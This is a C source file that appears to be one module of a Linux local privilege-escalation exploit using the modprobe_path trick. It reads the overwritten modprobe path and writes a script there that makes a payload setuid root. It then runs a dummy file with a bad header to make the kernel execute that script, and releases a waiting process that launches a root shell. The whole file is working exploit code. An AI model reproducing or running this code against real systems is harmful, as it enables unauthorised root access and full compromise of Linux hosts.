#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <sys/types.h>
#include <semaphore.h>
#include <string.h>
#include <sys/wait.h>

#include "log.h"
#include "modprobe.h"

const char dummy_file[] = "/tmp/dummy\0";

const char dummy_content[] = "\xff\xff\xff\xff";
const char* new_modprobe_content[] = { "#!/bin/bash\n\nchown root:root ",
	"\nchmod 4555 "
};

sem_t *shell_barrier;

/**
 * prepare_root_shell(): Setup a second process waiting out the namespaces used for the exploit
 */
void prepare_root_shell(char* payload) {

    int shmid = shmget(0x1337, sizeof(sem_t), IPC_CREAT | S_IRWXU | S_IRWXG | S_IRWXO);
    shell_barrier = shmat(shmid, NULL, 0);

    if (sem_init(shell_barrier, 1, 0) < 0)
        do_error_exit("sem_init");

    if (!fork()) {
        sem_wait(shell_barrier);

        execl(payload, payload, NULL);
        exit(EXIT_FAILURE);
    }
}

/**
 * create_dummy_file(): Create a file to trigger call_modprobe in case of execution
 */
void create_dummy_file(void) {
    int fd;

    fd = open(dummy_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    write(fd, dummy_content, sizeof(dummy_content));
    close(fd);
}

/**
 * get_root_shell(): Trigger a call to the new modprobe_path
 */
void get_root_shell(void) {
    int pid = fork();
    if (pid == 0)
    {
        execl("/tmp/dummy", "/tmp/dummy", NULL);
        exit(EXIT_FAILURE);
    }
    printf("[?] waitpid\n");
    waitpid(pid, NULL, 0);
    printf("[?] sem_post\n");
    sem_post(shell_barrier);
}

/**
 * get_new_modprobe_path(): Read the new modprobe_path
 *
 * Return: path stored within /proc/sys/kernel/modprobe
 */
char *get_new_modprobe_path(void) {

    int fd;
    char *modprobe_path = malloc(15);

    if (!modprobe_path)
        do_error_exit("malloc");

    fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0)
        do_error_exit("open(/proc/sys/kernel/modprobe)");

    read(fd, modprobe_path, 14);

    close(fd);

    modprobe_path[14] = '\0';

    return modprobe_path;
}

/**
 * write_new_modprobe(): Create chown && chmod script for get_root
 * @filename: current path to modprobe for the kernel
 */
void write_new_modprobe(char *filename, char* payloadpath) {

    int fd;

    fd = open(filename, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    if (fd < 0)
        do_error_exit("open");

    for (size_t i = 0; i < sizeof(new_modprobe_content) / sizeof(new_modprobe_content[0]); i++)
    {
      write(fd, new_modprobe_content[i], strlen(new_modprobe_content[i]));
      write(fd, payloadpath, strlen(payloadpath));
    }
    write(fd, "\n", 1);

    close(fd);
}

/**
 * setup_modprobe_payload(): Prepare all the needed stuff to get a root shell
 */
void setup_modprobe_payload(char* payloadpath) {
    char *filename;

    filename = get_new_modprobe_path();

    write_new_modprobe(filename, payloadpath);
    create_dummy_file();

    free(filename);
}
